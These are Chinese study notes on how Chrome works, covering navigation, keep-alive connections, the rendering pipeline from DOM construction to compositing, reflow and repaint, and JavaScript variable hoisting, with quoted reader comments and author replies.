> 因为连接里面使用了 rel="noopener noreferrer"这个属性。
>
> 这个涉及到安全了，要完整解释起来就话长了，我长话短说，先看阿里这个网站的连接是下面这种形式：
>
> <a target="_blank" rel="noopener noreferrer" class="hover" href=" " data-spm-anchor-id="a2c3t.11219538.iot-navBar.62">硬件商城</ a>
>
> 使用 noopener noreferrer 就是告诉浏览器，新打开的子窗口不需要访问父窗口的任何内容，这是为了防止一些钓鱼网站窃取父窗口的信息。
>
> 浏览器在打开新页面时，解析到含有 noopener noreferrer 时，就知道他们不需要共享页面内容，所以这时候浏览器就会让新链接在一个新页面中打开了。

参考 google 官方文档，貌似提交文档的原文是 commit navigation, 提交是从浏览器进程发起，至渲染进程，渲染进程确认导航，然后开始正式渲染；Now that the data and the renderer process is ready, an IPC is sent from the browser process to the renderer process to commit the navigation. It also passes on the data stream so the renderer process can keep receiving HTML data. Once the browser process hears confirmation that the commit has happened in the renderer process, the navigation is complete and the document loading phase begins.

最后是浏览器进程通知网络进程往管道里写响应体数据，渲染进程从管道中接收到数据并解析（同时浏览器进程进行页面更新，把解析完毕的数据刷新到页面）。

那么浏览器的 http 的 keepalive 的 connection 是什么粒度复用的呢？也是域名加协议头级别吗？

> 首先 keep-alive 是为了解决连接效率不高的问题，http1.0 时代，http 请求都是短连接的形式，也即是每次请求一个资源都需要和服务器建立连接+传输数据+断开连接，通常，建立连接和断开连接的时间就有可能超过传输数据的时间了，这种短连接的效率是异常的低效。
>
> 针对短连接低效的问题，后面就出现了长连接，也就是这里要讲的 keep-alive。
>
> 你可以把长连接看成是一个管道，一个 http 请求结束之后，不会关闭连接，下个请求可以复用该连接，这样就省去建立连接和断开连接的时间了，但是他们请求是按照顺序，也就是符合 IP+端口规则的资源都可以复用该连接，这就回答了上面提的这个问题。
>
> 但是，使用 keep-alive 同样存在问题，比如一个页面可能有 100 张图片素材，假设这些图片素材都保存在同一个域名下面，如果只复用一个 http 管道的话，那么传输 100 张图片的素材也是非常耗时间的，这就出现了同一时刻并发连接服务器的需求，也就是文中提到同一时刻，对同一域名下面，只能可以发起 6 个请求，这样就可以大大提升请求效率了。
>
> 为什么是 6 个请求而不是更多了，这是为了服务器性能考虑，如果同一时刻无限制连接，那么可能会导致服务器忙不过来。

操作系统中的任务管理器和浏览器中的任务管理器的进程数量不同，是因为有一些 chrome 进程在 chrome 自身的任务管理器中不会体现出来，比如预渲染进程。

## 渲染流程（上）

前面是导航流程，导航被提交后，进入渲染阶段。

了解渲染阶段相关流程能理解页面是如何工作的，可以解决一系列相关的问题，比如：

- 能够理解开发者工具里面大部分项目的含义
- 能优化页面卡顿
- 使用 JavaScript 优化动画流程
- 通过优化样式表来防止强制同步布局等

![img](https://static001.geekbang.org/resource/image/31/e6/31cd7172f743193d682d088a60cb44e6.png)

由于渲染机制过于复杂，所以**渲染模块在执行过程中会被划分为很多子阶段**，输入的 HTML 经过这些子阶段，最后输出像素。这样的一个处理流程叫做**渲染流水线**。

![img](https://static001.geekbang.org/resource/image/92/e8/9259f8732ddad472e5e08a633ad46de8.png)

按照渲染的时间顺序，流水线可分为如下几个子阶段：**构建 DOM 树、样式计算、布局阶段、分层、绘制、分块、光栅化和合成。**

**每个子阶段都有其输入的内容；**

**每个子阶段有其处理过程；**

**每个子阶段会生成输出内容。**

### 构建 DOM 树

为什么要构建 DOM 树呢？这是因为浏览器无法直接理解和使用 HTML，所以需要将 HTML 转换为浏览器能够理解的结构——DOM 树。

![img](https://static001.geekbang.org/resource/image/12/79/125849ec56a3ea98d4b476c66c754f79.png)

从图中可以看出，构建 DOM 树的**输入内容是一个 HTML 文件**，然后经**由 HTML 解析器解析**，最终**输出树状结构的 DOM**。

![img](https://static001.geekbang.org/resource/image/47/73/47f57c3eee749dd838939bfe5dd64573.png)

图中的 document 就是 DOM 结构，DOM 和 HTML 内容几乎是一样的，但是和 HTML 不同的是，**DOM 是保存在内存中树状结构**，**可以通过 JavaScript 来查询或修改其内容**。

生成 DOM 树了，但是 DOM 节点的样式我们依然不知道，要让 DOM 节点拥有正确的样式，这就需要样式计算了。

### 样式计算（Recalculate Style）

目的是为了计算出 DOM 节点中每个元素的具体样式，这个阶段大体可分为三步来完成。

#### 把 CSS 转换为浏览器能够理解的结构

CSS 样式的来源：

![img](https://static001.geekbang.org/resource/image/bc/7c/bc93df7b8d03b2675f21e1d9e4e1407c.png)

- 通过 link 引用的外部 CSS 文件

- `<style>标记内的 CSS`
- 元素的 style 属性内嵌的 CSS

浏览器无法直接理解这些纯文本的 CSS 样式，所以当渲染引擎接收到 CSS 文本时，会执行一个转换操作，将 CSS 文本转换为浏览器可以理解的结构——**styleSheets**。

![img](https://static001.geekbang.org/resource/image/8e/ab/8ec7d5ecfadcd05b3f1ec762223a9aab.png)

渲染引擎会把获取到的 CSS 文本全部转换为 styleSheets 结构中的数据（那三种来源的样式都包含进去了），并且该结构同时具备了查询和修改功能，为后面的样式操作提供基础。

#### 转换样式表中的属性值，使其标准化

已经把现有的 CSS 文本转化为浏览器可以理解的结构了，那么接下来就要**对其进行属性值的标准化操作**。

要理解什么是属性值标准化，可以看下面这样一段 CSS 文本：

```css
body {
  font-size: 2em;
}
p {
  color: blue;
}
span {
  display: none;
}
div {
  font-weight: bold;
}
div p {
  color: green;
}
div {
  color: red;
}
```

可以看到上面的 CSS 文本中有很多属性值，如 2em、blue、bold，这些类型数值不容易被渲染引擎理解，所以需要将所有值转换为渲染引擎容易理解的、标准化的计算值，这个过程就是属性值标准化。

那标准化后的属性值是什么样子的？

![img](https://static001.geekbang.org/resource/image/12/60/1252c6d3c1a51714606daa6bdad3a560.png)

#### 计算出 DOM 树中每个节点的具体样式

样式的属性已被标准化，接下来就需要计算 DOM 树中每个节点的样式属性。这涉及到 CSS 的继承规则和层叠规则。

CSS 继承就是每个 DOM 节点都包含有父节点的样式。

```css
body {
  font-size: 20px;
}
p {
  color: blue;
}
span {
  display: none;
}
div {
  font-weight: bold;
  color: red;
}
div p {
  color: green;
}
```

这张样式表最终应用到 DOM 节点的效果如下图所示：

![img](https://static001.geekbang.org/resource/image/fe/b4/fe9a0ea868dc02a3c4a59f6080aa80b4.png)

![img](https://static001.geekbang.org/resource/image/88/b2/88a3aac427cc7c09361eac01a85fc7b2.png)

- 可以选择要查看的元素的样式（位于图中的区域 2 中），在图中的第 1 个区域中 点击对应的元素元素，就可以了下面的区域查看该元素的样式了
- 可以从样式来源（位于图中的区域 3 中）中查看样式的具体来源信息，看看是来源于样式文件，还是来源于 UserAgent 样式表。这里需要特别提下 UserAgent 样式，它是浏览器提供的一组默认样式，如果你不提供任何样式，默认使用的就是 UserAgent 样式
- 可以通过区域 2 和区域 3 来查看样式继承的具体过程

样式计算过程中的第二个规则是样式层叠。层叠是 CSS 的一个基本特征，它是一个**定义了如何合并来自多个源的属性值的算法**。它在 CSS 处于核心地位。

样式计算阶段的目的是为了**计算出 DOM 节点中每个元素的具体样式**，在计算过程中需要**遵守 CSS 的继承和层叠两个规则**。这个阶段最终**输出的内容是每个 DOM 节点的样式**，**并被保存在 ComputedStyle 的结构内**。

**了解每个 DOM 元素最终的计算样式，**可以打开 Chrome 的“开发者工具”，选择第一个“element”标签，然后再选择“Computed”子标签，如下图所示：

![img](https://static001.geekbang.org/resource/image/d8/46/d87415b0187e3860404bf963f1c3d646.png)

### 布局阶段

已经有了 DOM 树和 DOM 树中元素的样式，但这还不足以显示页面，因为还不知道 DOM 元素的**几何位置信息**。那么接下来就需要计算出 DOM 树中**可见元素**的几何位置，把这个计算过程叫做**布局**。

Chrome 在布局阶段需要完成两个任务：创建布局树和布局计算。

#### 创建布局树

DOM 树还含有很多不可见的元素，比如 head 标签，还有使用了 display:none 属性的元素。所以在显示之前，我们还要额外地构建一棵**只包含**可见元素布局树。

结合下图来看看布局树的构造过程：

![img](https://static001.geekbang.org/resource/image/8e/0e/8e48b77dd48bdc509958e73b9935710e.png)

DOM 树中所有不可见的节点都没有包含到布局树中。

为了构建布局树，浏览器大体上完成了下面这些工作：

1. 遍历 DOM 树中的所有可见节点，并把这些节点加到布局树中；
2. 而不可见的节点会被布局树忽略掉，如 head 标签下面的全部内容，再比如 body.p.span 这个元素，因为它的属性包含 dispaly:none，所以这个元素也没有被包进布局树。

#### 布局计算

现在我们有了一棵完整的布局树。那么接下来，就要**计算布局树节点的坐标位置**。

**在执行布局操作的时候，会把布局运算的结果重新写回布局树中，所以布局树既是输入内容也是输出内容**，这是布局阶段一个不合理的地方，因为在布局阶段并没有清晰地将输入内容和输出内容区分开来。针对这个问题，Chrome 团队正在重构布局代码，下一代布局系统叫 LayoutNG，试图更清晰地分离输入和输出，从而让新设计的布局算法更加简单。

![img](https://static001.geekbang.org/resource/image/a4/9a/a4a0ea4da58260aafc9aabdd37613f9a.png)

1. 浏览器不能直接理解 HTML 数据，所以第一步需要将其转换为浏览器能够理解的 DOM 树结构；
2. 生成 DOM 树后，还需要根据 CSS 样式表，来计算出 DOM 树所有节点的样式；
3. 最后计算 DOM 元素的布局信息，使其都保存在布局树中。

到这里我们的每个节点都拥有了自己的样式和布局信息，那么后面几个阶段就要利用这些信息去展示页面。

**如果下载 CSS 文件阻塞了，会阻塞 DOM 树的合成吗？会阻塞页面的显示吗？**

```
当从服务器接收HTML页面的第一批数据时，DOM解析器就开始工作了，在解析过程中，如果遇到了JS脚本，如下所示：
<html>
    <body>
        极客时间
        <script>
        document.write("--foo")
        </script>
    </body>
</html>
那么DOM解析器会先执行JavaScript脚本，执行完成之后，再继续往下解析。

那么第二种情况复杂点了，我们内联的脚本替换成js外部文件，如下所示：
<html>
    <body>
        极客时间
        <script type="text/javascript" src="foo.js"></script>
    </body>
</html>
这种情况下，当解析到JavaScript的时候，会先暂停DOM解析，并下载foo.js文件，下载完成之后执行该段JS文件，然后再继续往下解析DOM。这就是JavaScript文件为什么会阻塞DOM渲染。

我们再看第三种情况，还是看下面代码：
<html>
    <head>
        <style type="text/css" src = "theme.css" />
    </head>
    <body>
        <p>极客时间</p>
        <script>
            let e = document.getElementsByTagName('p')[0]
            e.style.color = 'blue'
        </script>
    </body>
</html>
当我在JavaScript中访问了某个元素的样式，那么这时候就需要等待这个样式被下载完成才能继续往下执行，所以在这种情况下，CSS也会阻塞DOM的解析。


所以JS和CSS都有可能会阻塞DOM解析



下载CSS文件阻塞了，原则上会阻塞页面的显示，但是浏览器可以有自己的容错机制，例如下载超时后，均采用user-agent stylesheet 默认样式进行渲染就可以啦，虽然丑点，但是内容在HTML都显示出来


```

## 渲染流程（下）

前面介绍了渲染流水线中的 DOM 生成、样式计算和布局三个阶段。

现在有了布局树，而且每个元素的具体位置信息都计算出来了，那么接下来是不是就要开始着手绘制页面了？

答案依然是否定的。因为页面中有很多复杂的效果，如一些复杂的 3D 变换、页面滚动，或者使用 z-indexing 做 z 轴排序等，为了更加方便地实现这些效果，**渲染引擎还需要为特定的节点生成专用的图层，并生成一棵对应的图层树（LayerTree）**。

要想直观地理解什么是图层，你可以打开 Chrome 的“开发者工具”，选择“Layers”标签，就可以可视化页面的分层情况，如下图所示：

![img](https://static001.geekbang.org/resource/image/e2/c0/e2c917edf5119cddfbec9481372f8fc0.png)

渲染引擎给页面分了很多图层，这些图层按照一定顺序叠加在一起，就形成了最终的页面，你可以参考下图：

![img](https://static001.geekbang.org/resource/image/cd/78/cd6aac705501d48bda6e8eebca058b78.png)

浏览器的页面实际上被分成了很多图层，这些图层叠加后合成了最终的页面。下面我们再来看看这些图层和布局树节点之间的关系，如文中图所示：

![img](https://static001.geekbang.org/resource/image/e8/61/e8a7e60a2a08e05239456284d2aa4061.png)

通常情况下，**并不是布局树的每个节点都包含一个图层，如果一个节点没有对应的层，那么这个节点就从属于父节点的图层。**如上图中的 span 标签没有专属图层，那么它们就从属于它们的父节点图层。但不管怎样，最终每一个节点都会直接或者间接地从属于一个层。

**那么需要满足什么条件，渲染引擎才会为特定的节点创建新的图层呢？**通常满足下面两点中任意一点的元素就可以被提升为单独的一个图层。

**第一点，拥有层叠上下文属性的元素会被提升为单独的一层。**

页面是个二维平面，但是层叠上下文能够让 HTML 元素具有三维概念，这些 HTML 元素按照自身属性的优先级分布在垂直于这个二维平面的 z 轴上。你可以结合下图来直观感受下：

![img](https://static001.geekbang.org/resource/image/a0/19/a03eb12053aac1ac496b61a424f20119.png)

从图中可以看出，**明确定位属性的元素、定义透明属性的元素、使用 CSS 滤镜的元素等，都拥有层叠上下文属性。**

[层叠上下文](https://developer.mozilla.org/zh-CN/docs/web/css/css_positioning/understanding_z_index/the_stacking_context)

**第二点，需要剪裁（clip）的地方也会被创建为图层。**

什么是剪裁？

```jsx
<style>
      div {
            width: 200;
            height: 200;
            overflow:auto;
            background: gray;
        }
</style>
<body>
    <div >
        <p>所以元素有了层叠上下文的属性或者需要被剪裁，那么就会被提升成为单独一层，你可以参看下图：</p>
        <p>从上图我们可以看到，document层上有A和B层，而B层之上又有两个图层。这些图层组织在一起也是一颗树状结构。</p>
        <p>图层树是基于布局树来创建的，为了找出哪些元素需要在哪些层中，渲染引擎会遍历布局树来创建层树（Update LayerTree）。</p>
    </div>
</body>
```

在这里我们把 div 的大小限定为 200 _ 200 像素，而 div 里面的文字内容比较多，文字所显示的区域肯定会超出 200 _ 200 的面积，这时候就产生了剪裁，渲染引擎会把裁剪文字内容的一部分用于显示在 div 区域，下图是运行时的执行结果：

![img](https://static001.geekbang.org/resource/image/6a/0c/6a583733735edc1e4d7946740eb6fc0c.png)

出现这种裁剪情况的时候，渲染引擎会为文字部分单独创建一个层，如果出现滚动条，滚动条也会被提升为单独的层。你可以参考下图：

![img](https://static001.geekbang.org/resource/image/7b/97/7b6ceaab23c6c6d8e5930864ff9d7097.png)

所以说，**元素有了层叠上下文的属性或者需要被剪裁，满足其中任意一点，就会被提升成为单独一层。**

#### 图层绘制

在完成**图层树**的构建之后，**渲染引擎会对图层树中的每个图层进行绘制**，渲染引擎是怎么实现图层绘制的？

**渲染引擎实现图层的绘制，会把一个图层的绘制拆分成很多小的绘制指令，然后再把这些指令按照顺序组成一个待绘制列表，如下图所示：**

![img](https://static001.geekbang.org/resource/image/40/08/40825a55214a7990bba6b9bec6e54108.png)

从图中可以看出，绘制列表中的指令其实非常简单，就是让其执行一个简单的绘制操作，比如绘制粉色矩形或者黑色的线等。而绘制一个元素通常需要好几条绘制指令，因为每个元素的背景、前景、边框都需要单独的指令去绘制。所以在图层绘制阶段，**输出的内容就是这些待绘制列表**。

你也可以打开“开发者工具”的“Layers”标签，选择“document”层，来实际体验下绘制列表，如下图所示：、

![img](https://static001.geekbang.org/resource/image/30/70/303515c26fcd4eaa9b9966ad7f190370.png)

在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。

#### 栅格化（raster）操作

绘制列表只是用来记录**绘制顺序和绘制指令**的列表，而实际上绘制操作是由**渲染进程中的合成线程**来完成的。你可以结合下图来看下渲染主线程和合成线程之间的关系：

![img](https://static001.geekbang.org/resource/image/46/41/46d33b6e5fca889ecbfab4516c80a441.png)

如上图所示，当图层的绘制列表准备好之后，主线程会把该**绘制列表**提交（commit）给合成线程，那么接下来合成线程是怎么工作的呢？

那我们得先来看看什么是视口，你可以参看下图：

![img](https://static001.geekbang.org/resource/image/24/72/242225112f2a3ec97e736c960b88d972.png)

通常一个页面可能很大，但是用户只能看到其中的一部分，我们把用户可以看到的这个部分叫做视口（viewport）。在有些情况下，有的图层可以很大，比如有的页面你使用滚动条要滚动好久才能滚动到底部，但是通过视口，用户只能看到页面的很小一部分，所以在这种情况下，要绘制出所有图层内容的话，就会产生太大的开销，而且也没有必要。

基于这个原因，合成线程会将图层划分为图块（tile），这些图块的大小通常是 256x256 或者 512x512，如下图所示：

![img](https://static001.geekbang.org/resource/image/bc/52/bcc7f6983d5ece8e2dd716f431d0e052.png)

然后**合成线程会按照视口附近的图块来优先生成位图**，实际**生成位图的操作是由栅格化来执行的**。所谓栅格化，是指将图块转换为位图。而图块是栅格化执行的最小单位。**渲染进程维护了一个栅格化的线程池**，所有的图块栅格化都是在线程池内执行的，运行方式如下图所示：

![img](https://static001.geekbang.org/resource/image/d8/20/d8d77356211e12b47bb9f508e2db8520.png)

通常，栅格化过程都会使用 GPU 来加速生成，使用 GPU 生成位图的过程叫快速栅格化，或者 GPU 栅格化，生成的位图被保存在 GPU 内存中。

GPU 操作是运行在 GPU 进程中，如果栅格化操作使用了 GPU，那么最终生成位图的操作是在 GPU 中完成的，这就涉及到了跨进程操作。具体形式你可以参考下图：

![img](https://static001.geekbang.org/resource/image/a8/87/a8d954cd8e4722ee03d14afaa14c3987.png)

从图中可以看出，渲染进程把生成图块的指令发送给 GPU，然后在 GPU 中执行生成图块的位图，并保存在 GPU 的内存中。

#### 合成和显示

一旦所有图块都被光栅化，合成线程就会生成一个绘制图块的命令——“DrawQuad”，然后将该命令提交给浏览器进程。浏览器进程里面有一个叫 viz 的组件，用来接收合成线程发过来的 DrawQuad 命令，然后根据 DrawQuad 命令，获取 GPU 进程内存中的位图，并将其页面内容绘制到内存中，最后再将内存显示在屏幕上。到这里，经过这一系列的阶段，编写好的 HTML、CSS、JavaScript 等文件，经过浏览器就会显示出页面了。

#### 渲染流水线大总结

从 HTML 到 DOM、样式计算、布局、图层、绘制列表、光栅化、合成和显示。下面我用一张图来总结下这整个渲染流程：

![img](https://static001.geekbang.org/resource/image/97/37/975fcbf7f83cc20d216f3d68a85d0f37.png)

结合上图，一个完整的渲染流程大致可总结为如下：

1. 渲染进程将 HTML 内容转换为能够读懂的 DOM 树结构。
2. 渲染引擎将 CSS 样式表转化为浏览器可以理解的 styleSheets，计算出 DOM 节点的样式。
3. 创建布局树，并计算元素的布局信息。
4. 对布局树进行分层，并生成分层树。
5. 为每个图层生成绘制列表，并将其提交到合成线程。
6. 合成线程将图层分成图块，并在光栅化线程池中将图块转换成位图。
7. 合成线程发送绘制图块命令 DrawQuad 给浏览器进程。
8. 浏览器进程根据 DrawQuad 消息生成页面，并显示到显示器上。

#### 相关概念

三个和渲染流水线相关的概念——“重排”“重绘”和“合成”。理解了这三个概念对于你后续 Web 的性能优化会有很大帮助。

##### 更新了元素的几何属性（重排）

![img](https://static001.geekbang.org/resource/image/b3/e5/b3ed565230fe4f5c1886304a8ff754e5.png)

从上图可以看出，如果你通过 JavaScript 或者 CSS 修改元素的几何位置属性，例如**改变元素的宽度、高度等，那么浏览器会触发重新布局，解析之后的一系列子阶段，这个过程就叫重排**。无疑，**重排需要更新完整的渲染流水线，所以开销也是最大的。**

##### 更新元素的绘制属性（重绘）

比如通过 JavaScript 更改某些元素的背景颜色，渲染流水线会怎样调整呢？你可以参考下图：

![img](https://static001.geekbang.org/resource/image/3c/03/3c1b7310648cccbf6aa4a42ad0202b03.png)

从图中可以看出，如果修改了元素的背景颜色，那么布局阶段将不会被执行，因为并没有引起几何位置的变换，所以就直接进入了绘制阶段，然后执行之后的一系列子阶段，这个过程就叫重绘。**相较于重排操作，重绘省去了布局和分层阶段，所以执行效率会比重排操作要高一些。**

##### 直接合成阶段

那如果你更改一个既不要布局也不要绘制的属性，会发生什么变化呢？渲染引擎将跳过布局和绘制，只执行后续的合成操作，我们把这个过程叫做合成。具体流程参考下图：

![img](https://static001.geekbang.org/resource/image/02/2c/024bf6c83b8146d267f476555d953a2c.png)

在上图中，**我们使用了 CSS 的 transform 来实现动画效果，这可以避开重排和重绘阶段，直接在非主线程上执行合成动画操作。这样的效率是最高的，因为是在非主线程上合成，并没有占用主线程的资源，另外也避开了布局和绘制两个子阶段，所以相对于重绘和重排，合成能大大提升绘制效率。**

#### 总结

Chrome 的渲染流水线还是相当复杂晦涩，且难以理解，不过 Chrome 团队在不断添加新功能的同时，也在不断地重构一些子阶段，目的就是让整体渲染架构变得更加简单和高效。

在优化 Web 性能的方法中，减少重绘、重排是一种很好的优化方式，那么结合文中的分析，你能总结出来为什么减少重绘、重排能优化 Web 性能吗？那又有那些具体的实践方法能减少重绘、重排呢？

> 减少重排重绘, 方法很多：
>
> 1. 使用 class 操作样式，而不是频繁操作 style
> 2. 避免使用 table 布局
> 3. 批量 dom 操作，例如 createDocumentFragment，或者使用框架，例如 React
> 4. Debounce window resize 事件
> 5. 对 dom 属性的读写要分离
> 6. will-change: transform 做优化
>
> 减少重排重绘，相当于少了渲染进程的主线程和非主线程的很多计算和操作，能够加快 web 的展示。 1 触发 repaint reflow 的操作尽量放在一起，比如改变 dom 高度和设置 margin 分开写，可能会出发两次重排 2 通过虚拟 dom 层计算出操作总得差异，一起提交给浏览器。之前还用过 createdocumentfragment 来汇总 append 的 dom,来减少触发重排重绘次数。

关于浏览器渲染的知识点讲的很细致，我想问下，关于浏览器的渲染细节的知识老师是从哪里学到的？，是通过研究源码学习的吗？有没有一些好的学习资料或者学习方法推荐？

```js
作者回复: 主要几个途径：
1:chromium源码
2:chromium源码里面的一些注释和文档
3:还有油管上blinkon上有一些深入讲解内核的视频


目前基本没有系统介绍浏览器知识的文档，而且网上很多文档还是比较早期的，很多内容都不太适合新版的浏览器了。

这里将浏览器知识和前端系统下结合起来是一件工作量非常大的事。



作者回复: 可以拿放电影电影来解释，通常，电影的帧速是24，也就是说每秒切换24幅画面，其中的每幅画面就是一帧。

理解什么是帧后，我们在回过头看看我们的页面。由于目前大多数设备的屏幕刷新率为 60 次/秒。因此，如果页面中有一个动画、或一个渐变效果、或者用户正在滚动页面，那么浏览器渲染动画的频率至少要和刷新频率保持一致，也就是每秒需要更新60次，这样我们就能计算出来生成每帧的预算只有（1/60）毫秒，也就是16毫秒多一点(1 秒/ 60 = 16.66 毫秒)。如果超过16毫秒，帧率将下降，并且会出现画面抖动现象，此现象通常被称为卡顿，会对用户体验产生负面影响。



所以，如果想要保证画面的流畅，就需要尽量降低每帧的渲染时间，所以局部更新流水线显得非常重要了，能大大减少处理每帧所消耗的时间。



渲染流程的最后，应该是浏览器进程将Compositor Frame发送到GPU, GPU进行显示吧？

作者回复: 这块我没深入将了，因为结构比较复杂，chromium团队还在重构大的架构，既然你问到了，我就简要介绍下：

1:首先渲染进程里执行图层合成(Layer Compositor)，也就是生成图层的操作，具体地讲，渲染进程的合成线程接收到图层的绘制消息时，会通过光栅化线程池将其提交给GPU进程，在GPU进程中执行光栅化操作，执行完成，再将结果返回给渲染进程的合成线程，执行合成图层操作！

2:合成的图层会被提交给浏览器进程，浏览器进程里会执行显示合成(Display Compositor)，也就是将所有的图层合成为可以显示的页面图片。 最终显示器显示的就是浏览器进程中合成的页面图片
```

## 变量提升

JavaScript 执行原理

JavaScript 的执行分为两个阶段：

- 编译阶段
- 执行阶段

#### 执行上下文

只有理解了 JavaScrip 的执行上下文，才能更好地理解 JavaScript 语言本身，比如**变量提升、作用域和闭包**等。

```js
showName();
console.log(myname);
var myname = '极客时间';
function showName() {
  console.log('函数showName被执行');
}
```

![img](https://static001.geekbang.org/resource/image/fb/03/fbafaba4ad7092cbee011a8a02e38903.png)

函数或者变量可以在定义之前使用。

```js
showName();
console.log(myname);
function showName() {
  console.log('函数showName被执行');
}
```

![img](https://static001.geekbang.org/resource/image/a5/c2/a5262e2ca891ea114dfaf1e37f9ca4c2.png)

结论:

1. 在执行过程中，若使用了未声明的变量，那么 JavaScript 执行会报错。
2. 在一个变量定义之前使用它，不会出错，但是该变量的值会为 undefined，而不是定义时的值。
3. 在一个函数定义之前使用它，不会出错，且函数能正确执行。

#### 变量提升（Hoisting）

变量的「创建」「初始化」「赋值」三种区别

在块作用域内，let 声明的变量被提升，但变量只是创建被提升，初始化并没有被提升，在初始化之前使用变量，就会形成一个暂时性死区。

【拓展】

var 的创建和初始化被提升，赋值不会被提升。

let 的创建被提升，初始化和赋值不会被提升。

function 的创建、初始化和赋值均会被提升。

**变量的声明和赋值**

```js
var myname = '极客时间';

var myname = undefined; //声明部分 的 创建被提升 同时 初始化被提升且值为undefined
myname = '极客时间'; //赋值部分
```

![img](https://static001.geekbang.org/resource/image/ec/3c/ec882f2d9deec26ce168b409f274533c.png)

**函数的声明和赋值**

```js
function foo() {
  console.log('foo');
}

var bar = function () {
  console.log('bar');
};
```

![img](https://static001.geekbang.org/resource/image/61/77/611c09ab995b9b608d9c0db193266777.png)

所谓的变量提升，是指**在 JavaScript 代码执行过程中**，**JavaScript 引擎把变量的声明部分和函数的声明部分**提升到代码开头的“行为”。变量被提升后，会给变量设置默认值，这个默认值就是我们熟悉的 undefined。

```js
/*
 * 变量提升部分
 */
// 把变量 myname提升到开头，
// 同时给myname赋值为undefined
var myname = undefined;
// 把函数showName提升到开头
function showName() {
  console.log('showName被调用');
}

/*
 * 可执行代码部分
 */
showName();
console.log(myname);
// 去掉var声明部分，保留赋值语句
myname = '极客时间';
```

![img](https://static001.geekbang.org/resource/image/ce/d5/cefe564dbff729e735a834fd9e3bd0d5.png)

- 第一处是把声明的部分都提升到了代码开头，如变量 myname 和函数 showName，并给变量设置默认值 undefined；
- 第二处是移除原本声明的变量和函数，如 var myname = '极客时间'的语句，移除了 var 声明，整个移除 showName 的函数声明。

从概念的字面意义上来看，“变量提升”意味着变量和函数的声明会在物理层面移动到代码的最前面，正如我们所模拟的那样。但这并不准确。实际上变量和函数声明在代码里的位置是不会改变的，而且是在**编译阶段**被 JavaScript 引擎放入内存中。

**一段 JavaScript 代码在执行之前需要被 JavaScript 引擎编译，编译完成之后，才会进入执行阶段。**大致流程你可以参考下图：

![img](https://static001.geekbang.org/resource/image/64/1e/649c6e3b5509ffd40e13ce9c91b3d91e.png)

##### 编译阶段

编译阶段和变量提升存在什么关系？

为了搞清楚这个问题，我们还是回过头来看上面那段模拟变量提升的代码，为了方便介绍，可以把这段代码分成两部分。

第一部分：变量提升部分的代码。

```js
var myname = undefined;
function showName() {
  console.log('函数showName被执行');
}
```

第二部分：执行部分的代码。

```js
showName();
console.log(myname);
myname = '极客时间';
```

可以把 JavaScript 的执行流程细化，如下图所示：

![img](https://static001.geekbang.org/resource/image/06/13/0655d18ec347a95dfbf843969a921a13.png)

从上图可以看出，**输入一段代码，经过编译后，会生成两部分内容：执行上下文（Execution context）和可执行代码。**

**执行上下文是 JavaScript 执行一段代码时的运行环境**，比如调用一个函数，就会进入这个函数的执行上下文，确定该函数在执行期间用到的诸如 this、变量、对象以及函数等。

在执行上下文中存在一个**变量环境的对象**（Viriable Environment），该对象中保存了变量提升的内容，比如上面代码中的变量 myname 和函数 showName，都保存在该对象中。

可以简单地把变量环境对象看成是如下结构：

```\
VariableEnvironment:
     myname -> undefined,
     showName ->function : {console.log(myname)
```

了解完变量环境对象的结构后，接下来，我们再结合下面这段代码来分析下是如何生成变量环境对象的。

```js
showName();
console.log(myname);
var myname = '极客时间';
function showName() {
  console.log('函数showName被执行');
}
```

可以一行一行来分析上述代码：

- 第 1 行和第 2 行，由于这两行代码不是声明操作，所以 JavaScript 引擎不会做任何处理；
- 第 3 行，由于这行是经过 var 声明的，因此 JavaScript 引擎将在环境对象中**创建**一个名为 myname 的属性，并使用 undefined 对其**初始化**；
- 第 4 行，JavaScript 引擎发现了一个通过 function 定义的函数，所以它将函数定义存储到堆 (HEAP）中，并在环境对象中创建一个 showName 的属性，然后将该属性值指向堆中函数的位置。

这样就生成了**变量环境对象**。接下来 JavaScript 引擎会把声明以外的代码编译为字节码。

```
showName()
console.log(myname)
myname = '极客时间'
```

##### 执行阶段

JavaScript 引擎开始执行“可执行代码”，按照顺序一行一行地执行。

- 当执行到 showName 函数时，JavaScript 引擎便开始在变量环境对象中查找该函数，由于变量环境对象中存在该函数的引用，所以 JavaScript 引擎便开始执行该函数，并输出“函数 showName 被执行”结果。

- 接下来打印“myname”信息，JavaScript 引擎继续在变量环境对象中查找该变量，由于变量环境存在 myname 变量，并且其值为 undefined，所以这时候就输出 undefined。

- 接下来执行第 3 行，把“极客时间”赋给 myname 变量，赋值后变量环境中的 myname 属性值改变为“极客时间”，变量环境如下所示：

  ```
  VariableEnvironment:
       myname -> "极客时间",
       showName ->function : {console.log(myname)
  ```

  以上就是一段代码的编译和执行流程。实际上，编译阶段和执行阶段都是非常复杂的，包括了**词法分析、语法解析、代码优化、代码生成**等。

**代码中出现相同的变量或者函数怎么办？**

**在执行一段 JavaScript 代码之前，会编译代码，并将代码中的函数和变量保存到执行上下文的变量环境中**，那么如果代码中出现了重名的函数或者变量，JavaScript 引擎会如何处理？

```js
function showName() {
  console.log('极客邦');
}
showName();
function showName() {
  console.log('极客时间');
}
showName();
```

完整执行流程：

- 首先是编译阶段。遇到了第一个 showName 函数，会将该函数体存放到变量环境中。接下来是第二个 showName 函数，继续存放至变量环境中，但是变量环境中已经存在一个 showName 函数了，此时，第二个 showName 函数会将第一个 showName 函数覆盖掉。这样变量环境中就只存在第二个 showName 函数了。
- 接下来是执行阶段。先执行第一个 showName 函数，但由于是从变量环境中查找 showName 函数，而变量环境中只保存了第二个 showName 函数，所以最终调用的是第二个函数，打印的内容是“极客时间”。第二次执行 showName 函数也是走同样的流程，所以输出的结果也是“极客时间”。

总结：

- JavaScript 代码执行过程中，需要先做变量提升，而之所以需要实现变量提升，是因为 JavaScript 代码在执行之前需要先编译。
- 在编译阶段，变量和函数会被存放到变量环境中，变量的默认值会被设置为 undefined；在代码执行阶段，JavaScript 引擎会从变量环境中去查找自定义的变量和函数。
- 如果在编译阶段，存在两个相同的函数，那么最终存放在变量环境中的是最后定义的那个，这是因为后定义的会覆盖掉之前定义的。

**JavaScript 的执行机制：先编译，再执行。**

下面是关于同名变量和函数的两点处理原则：

1. 如果是同名的函数，JavaScript 编译阶段会选择最后声明的那个。
2. 如果变量和函数同名，那么在编译阶段，变量的声明会被忽略。
3. 函数提升要比变量提升的优先级要高一些，且不会被变量声明覆盖，但是会被变量在执行阶段的赋值覆盖。

```js
